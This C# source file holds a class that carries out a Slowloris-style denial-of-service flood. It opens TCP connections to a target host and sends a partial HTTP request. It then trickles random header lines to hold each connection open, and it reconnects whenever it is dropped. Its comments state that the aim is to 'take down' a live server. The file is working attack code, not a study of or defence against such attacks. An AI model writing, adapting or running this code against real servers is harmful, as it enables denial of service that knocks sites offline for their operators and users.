﻿using System.Net;
using System.Net.Sockets;
using System.Text;

internal class LimitedHttpConnection
{
    private readonly TargetInfo _target;

    private Socket? socket;
    private ThrottledNetworkStream? stream;

    private bool _isFlooding = true;

    public LimitedHttpConnection(TargetInfo target)
    {
        _target = target;
    }

    private async Task WriteAsync(string format, params object[] args)
    {
        byte[] buffer = Encoding.UTF8.GetBytes(string.Format(format, args));
        await stream!.WriteAsync(buffer);
    }

    private async Task ConnectAsync()
    {
        // if host is an IP address, just parse it and connect
        if (IPAddress.TryParse(_target.host, out IPAddress? address))
        {
            socket = new (address.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            await socket.ConnectAsync(new IPEndPoint(address, _target.port));
        }
        else
        {
            // if host is a hostname, get the IP addresses of that host
            // and check each of them for available connection
            IPAddress[] addresses = Dns.GetHostAddresses(_target.host);
            foreach (IPAddress addr in addresses)
            {
                socket = new (addr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                await socket.ConnectAsync(new IPEndPoint(addr, _target.port));
                // if we were able to connect it means that the server is still alive
                // and we have to take it down first                
                if (socket.Connected) { break; }

                // if we weren't able to connect then clear out current socket
                // and check for another IP address
                socket.Close();
                socket.Dispose();
                socket = null;
            }

        }

        // if we have connection
        if (socket is not null && socket.Connected)
        {
            // set statistics state for that target to 'connected'
            Statistics.RecordConnectionEstablished(_target.host);
            // create throttled stream
            stream = new(socket, _target);
            // send out throttled http headers
            await SendHeadersAsync();
        }
    }

    private async Task SendHeadersAsync()
    {
        const string FORMAT = "GET / HTTP/1.1\r\nHost: {0}\r\nAccept: */*\r\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n";
        await WriteAsync(FORMAT, _target.host);
    }

    private async Task KeepAliveAsync()
    {
        const string FORMAT = "KeepAlive: {0}\r\n";
        await WriteAsync(FORMAT, new Random().Next(0, 1000));
    }

    public async Task FloodHost()
    {
        _isFlooding = true;
        while (_isFlooding)
        {
            await ConnectAsync();
            while (socket is not null && socket.Connected && _isFlooding)
            {
                try 
                {
                    // try sending the message
                    await KeepAliveAsync();
                }
                // if we get disconnected
                catch { break; } // break from the current loop and reconnect
                await Task.Delay(new Random().Next(0, 500));
            }
        }
        stream?.CloseAndDispose();
        socket = null;
    }

    public void Stop()
    {
        _isFlooding = false;
    }
}
